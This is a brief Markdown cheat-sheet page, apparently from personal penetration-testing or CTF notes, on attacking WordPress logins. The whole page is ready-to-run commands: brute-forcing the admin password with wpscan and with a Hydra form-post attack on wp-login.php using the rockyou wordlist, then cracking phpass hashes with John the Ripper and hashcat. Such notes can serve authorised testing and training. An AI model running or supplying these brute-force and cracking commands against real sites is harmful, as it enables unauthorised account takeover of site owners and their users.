---
title: Wordpress
parent: Web
layout: default
nav_order: 2
---

1. `wpscan --usernames admin --passwords /usr/share/seclists/rockyou.txt --max-threads 50 --url IP/xxx `
   (admin can be wordlist as well, and xxx can be blog or something)
2. OR use Hydra: should be faster:\
   `hydra -l admin -P /usr/share/seclists/rockyou.txt IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`\
   (For the testcookie part, check in source code for the login page. for eg in this case <input type="hidden" name="testcookie" value="1" />)
3. If you have hash(`$P$B....`), can put in format user:hash (`\\\` is to escape a single `/`):\
   `john hash.txt --wordlist=/usr/share/seclists/rockyou.txt --format=phpass`
4. Can use hashcat also (but the hash format only can have hash, no username):\
   `hashcat -m 400 -a 0 wp.hash /usr/share/seclists/rockyou.txt`